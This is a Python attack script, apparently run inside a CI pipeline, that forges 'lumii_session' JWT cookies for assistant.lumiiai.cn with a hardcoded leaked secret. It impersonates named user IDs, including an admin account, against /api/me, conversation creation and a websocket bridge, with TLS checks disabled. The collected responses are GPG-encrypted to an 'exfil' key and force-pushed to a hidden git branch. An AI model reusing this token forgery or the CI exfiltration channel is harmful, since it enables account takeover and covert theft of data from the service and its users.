#!/usr/bin/env python3
# diag (intent 28278): determine WHY forged lumii_session now returns 403.
# REST-only, fast. Tests many sub/claim variants + raw connectivity + headers.
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, ssl, subprocess, shutil, threading, traceback
import http.client

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
START = time.time()
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
HOSTS = ["assistant.lumiiai.cn", "dashboard.lumiiai.cn"]

OUT = "/tmp/resultsd"
os.makedirs(OUT, exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(claims, secret=JWT_SECRET):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps(claims, separators=(',', ':')))
    sig = hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return "lumii_session=" + h + "." + p + "." + b64u(sig)

CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
def call(host, path, method="GET", cookie=None, data=None, timeout=15):
    headers = {"Accept": "*/*", "User-Agent": "Mozilla/5.0", "Connection": "close"}
    if cookie: headers["Cookie"] = cookie
    body = None
    if data is not None:
        body = json.dumps(data).encode(); headers["Content-Type"] = "application/json"
    c = http.client.HTTPSConnection(host, 443, timeout=timeout, context=CTX)
    try:
        c.request(method, path, body=body, headers=headers)
        r = c.getresponse(); b = r.read()
        hd = {k.lower(): v for k, v in r.getheaders()}
        return r.status, hd, b
    except Exception as e:
        return -1, {}, ("ERR:" + repr(e)).encode()
    finally:
        try: c.close()
        except Exception: pass

SUBS = {
    "brian":  "usr_j7t9Dhq4M4obQkag5huJi",
    "admin":  "usr_ZxLewKrgbRYSm7rWDtQX8",
    "lufeng": "usr_2gzZoKLgRAYaFNy2Sav4v",
    "xukui":  "usr_CMU92C54VpuSAXoCfbXDE",
    "bogus":  "usr_bogus_deadbeef",
}
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
now = int(time.time())

def variant_tokens(sub):
    out = {}
    out["plain"] = {"sub": sub, "org": ORG, "iat": now, "exp": now + 2592000, "sid": "sid_" + str(uuid.uuid4()), "lgn": now}
    out["tv0"] = dict(out["plain"], tv=0)
    out["token_version0"] = dict(out["plain"], token_version=0)
    out["tvorig"] = dict(out["plain"], tv=1)
    out["mins"] = {"sub": sub, "org": ORG, "exp": now + 3600}
    out["authver"] = dict(out["plain"], auth_version=0, av=0)
    return out

def main():
    log("=== diag start", RUNID, "===")
    res = {}
    # raw health + root (unauth)
    for h in HOSTS:
        for p in ("/health", "/api/health", "/", "/api/me"):
            st, hd, b = call(h, p)
            res["unauth %s %s" % (h, p)] = {"status": st, "cf-ray": hd.get("cf-ray"), "server": hd.get("server"),
                                            "body": b[:300].decode(errors="replace")}
            log("RAW", h, p, "->", st, "srv=", hd.get("server"), "cf=", bool(hd.get("cf-ray")), "len", len(b))
    # each sub + variants against /api/me and POST /api/conversations
    for tag, sub in SUBS.items():
        for vname, claims in variant_tokens(sub).items():
            ck = jwt(claims)
            st, hd, b = call(HOSTS[0], "/api/me", cookie=ck)
            log("ME", tag, vname, "->", st, "len", len(b), b[:120].decode(errors="replace"))
            res["me %s %s" % (tag, vname)] = {"status": st, "body": b[:300].decode(errors="replace")}
        # conv create only for plain
        ck = jwt({"sub": sub, "org": ORG, "iat": now, "exp": now + 2592000, "sid": "sid_" + str(uuid.uuid4()), "lgn": now})
        st, hd, b = call(HOSTS[0], "/api/conversations", method="POST", cookie=ck,
                         data={"title": "diag", "assistantId": "asst_E3G6xx8h7Ei279q6ossJ6", "participants": []})
        res["conv %s" % tag] = {"status": st, "body": b[:300].decode(errors="replace")}
        log("CONV", tag, "->", st, b[:160].decode(errors="replace"))
    # Test bridge ws with brian plain token (no dispatch) to see handshake code
    try:
        raw = socket.create_connection((HOSTS[0], 443), timeout=10)
        s = CTX.wrap_socket(raw, server_hostname=HOSTS[0])
        key = base64.b64encode(os.urandom(16)).decode()
        tok = jwt({"org": ORG, "conversation_id": "conv_x", "assistant_id": "asst_E3G6xx8h7Ei279q6ossJ6", "exp": now + 3600},
                  secret="bj_OgwjI66ar4GaKk23w6QKQgbyi5eHBj1JgBA8XH_Q9EoInnrX0JLovzhfrvT0X")
        req = ("GET /ws/bridge HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nAuthorization: Bearer %s\r\n\r\n" % (HOSTS[0], key, tok))
        s.sendall(req.encode()); s.settimeout(8)
        buf = b""
        try:
            buf = s.recv(2048)
        except Exception as e:
            buf = ("ERR:" + repr(e)).encode()
        res["ws_handshake"] = buf[:300].decode(errors="replace")
        log("WS handshake ->", buf[:200].decode(errors="replace"))
        s.close()
    except Exception as e:
        log("WS exc", repr(e)[:120])
    with open(os.path.join(OUT, "diag.json"), "w") as f:
        json.dump(res, f, ensure_ascii=False, indent=1)
    push_results("diag")
    log("DONE")

RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-bridge5-28278-results")
def push_results(tag="part"):
    enc = "/tmp/resultsd.tar.gz.gpg"
    try:
        for p in ("/tmp/resultsd.tar.gz", enc, "resultsd.tar.gz.gpg"):
            try:
                if os.path.isfile(p): os.remove(p)
            except Exception: pass
        subprocess.run("tar czf /tmp/resultsd.tar.gz -C /tmp resultsd", shell=True, check=False)
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/resultsd.tar.gz" % enc,
                           shell=True, capture_output=True, text=True, timeout=300)
        if os.path.isfile(enc) and os.path.getsize(enc) < 95 * 1024 * 1024:
            shutil.copy(enc, "resultsd.tar.gz.gpg")
            subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
            subprocess.run("git add -f resultsd.tar.gz.gpg && git commit -m 'ci diag %s %s' || true" % (RUNID, tag), shell=True, check=False)
            r = subprocess.run("git push -f origin HEAD:refs/heads/%s" % RESULT_BRANCH, shell=True, capture_output=True, text=True, timeout=600)
            log("PUSH rc=%s err=%s" % (r.returncode, (r.stderr or "")[-160:]))
    except Exception as e:
        log("PUSH EXC", repr(e))

try:
    main()
except Exception:
    log("FATAL", traceback.format_exc())
    try: push_results("fatal")
    except Exception: pass
sys.exit(1)
